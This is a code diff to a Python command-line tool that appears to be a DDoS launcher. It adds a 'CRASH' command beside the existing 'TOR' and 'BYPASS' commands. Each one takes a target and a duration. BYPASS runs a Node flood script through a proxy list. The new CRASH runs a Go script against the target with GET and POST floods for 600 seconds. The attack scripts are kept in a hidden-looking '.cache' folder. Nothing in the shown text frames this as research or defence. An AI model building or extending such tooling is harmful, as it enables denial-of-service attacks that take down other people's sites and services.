@@ -17,6 +17,7 @@ def pro(cr, tl, br_ln=30):
 def clr_csl():
     o.system("cls" if o.name == "nt" else "clear")
 
+
 def dis_ds():
     up_tm = int(t.time() - ses_srt)
     minutes, seconds = divmod(up_tm, 60)
@@ -153,7 +154,7 @@ def mn_lp():
                 ani_txt("👋 Goodbye, have a great day.", 0.02)
                 break
 
-            elif cmd in ["TOR", "BYPASS"]:
+            elif cmd in ["TOR", "BYPASS", "CRASH"]:
                 try:
                     tg = parts[1]
                     mx_tm = int(parts[2])
@@ -175,6 +176,13 @@ def mn_lp():
                             rn_cmd(f"python3 root/scrape.py &")
                             rn_cmd(
                                 f"node bin/odd/.cache/BYPASS.js {tg} 600 100 10 root/proxy.txt"
+                            )
+                        elif cmd == "CRASH":
+                            rn_cmd(
+                                f"go run bin/odd/.cache/CRASH.go {tg} 9999 get 600 nil"
+                            )
+                            rn_cmd(
+                                f"go run bin/odd/.cache/CRASH.go {tg} 9999 post 600 nil"
                             )
                         t.sleep(1)
                 except IndexError:
